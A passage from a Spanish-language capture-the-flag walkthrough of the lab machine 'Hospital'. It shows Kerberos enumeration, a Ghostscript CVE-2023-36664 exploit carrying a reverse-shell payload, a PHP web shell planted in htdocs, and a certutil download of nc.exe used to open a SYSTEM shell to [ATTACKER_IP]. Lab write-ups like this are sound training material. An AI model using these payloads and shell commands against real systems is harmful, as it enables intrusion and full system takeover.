[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User drbrown doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User drwilliams doesn't have UF_DONT_REQUIRE_PREAUTH set
```

No es posible.

Se prueba a ver si algún usuario tiene deshabilitada la preautenticación **Kerberos**.

```PowerShell
impacket-GetNPUsers 'hospital.htb/drwilliams:qwe123!@#'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

No se encuentra nada en el dominio.
### Hospital WebMail

Se prueba a acceder con las credenciales encontradas anteriormente.

![](Screenshots/Pasted%20image%2020260520175601.png)

El usuario `drbrown` nos esta pidiendo un archivo con extensión `.eps` para visualizar con `GhostScript`.

---
## Windows Privilege Escalation
### GhostScript Command Injection

El servicio Hospital WebMail procesaba automáticamente archivos `.eps` utilizando `Ghostscript`. 

La versión instalada era vulnerable a `CVE-2023-36664`, permitiendo ejecución arbitraria de comandos mediante PostScript malicioso embebido en el documento.

Esto convierte una funcionalidad legítima de renderizado de documentos en un vector de ejecución remota de código.

[Ghostscript command injection vulnerability PoC (CVE-2023-36664)](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection).

```PowerShell
git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git
cd CVE-2023-36664-Ghostscript-command-injection
python3 CVE_2023_36664_exploit.py --payload "[RevereShell_PowerShell_Base64]" -g -x eps
[+] Generated EPS payload file: malicious.eps
```

Máquina atacante:

```PowerShell
rlwrap -cAr nc -nlvp 445
```

Máquina victima:

Se responde el mensaje, enviando el archivo malicioso.

![](Screenshots/Pasted%20image%2020260520181043.png)

Se obtiene una consola interactiva con `drbrown`.

La flag de `usuario` se encuentra en: `C:\Users\drbrown.HOSPITAL\Desktop>`.
### Writable HTDocs Directory

En el directorio: `C:\xampp\htdocs`, es donde se encuentra el servicio: `Hospital WebMail`, se lista los permisos de los usuarios.

```PowerShell
PS C:\xampp> icacls htdocs
htdocs NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F)
       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
       BUILTIN\Administrators:(I)(OI)(CI)(F)
       BUILTIN\Users:(I)(OI)(CI)(RX)
       BUILTIN\Users:(I)(CI)(AD)
       BUILTIN\Users:(I)(CI)(WD)
       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

Los usuarios autenticados poseen permisos de escritura sobre el directorio `htdocs`, permitiendo subir archivos arbitrarios accesibles desde el servidor web.
### Arbitrary File Upload

Máquina atacante:

```PowerShell
cat cmd.php
<?php
   echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>

python3 -m http.server 80
```

Máquina victima:

```PowerShell
PS C:\xampp> cd htdocs
PS C:\xampp\htdocs> curl http://[ATTACKER_IP]/cmd.php -o cmd.php
```

```HTTP
https://hospital.htb/cmd.php?cmd=whoami
```

Se obtiene la respuesta: `nt authority\system`.
### Reverse Shell

Máquina atacante:

```PowerShell
cp /usr/share/windows-resources/binaries/nc.exe .
python3 -m http.server 80 
```

Máquina victima:

```PowerShell
cd C:\Windows\Temp
mkdir Bynary
cd Bynary
certutil.exe -f -urlcache -split http://[ATTACKER_IP]/nc.exe nc.exe
PS C:\Windows\Temp\Bynary> dir


    Directory: C:\Windows\Temp\Bynary


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        5/20/2026   4:41 PM          59392 nc.exe
```

Ya tenemos en la máquina victima `nc.exe`.

Se procede a realizar la *reverse shell*.

Máquina atacante:

```PowerShell
nc -nlvp 446
```

Máquina victima:

```HTTP
https://hospital.htb/cmd.php?cmd=C:\\Windows\\Temp\\Bynary\\nc.exe -e cmd [ATTACKER_IP] 446
```

Se obtiene una consola interactiva con `nt authority\system`.

La flag de `root` se encuentra en `C:\Users\Administrator\Desktop`.

---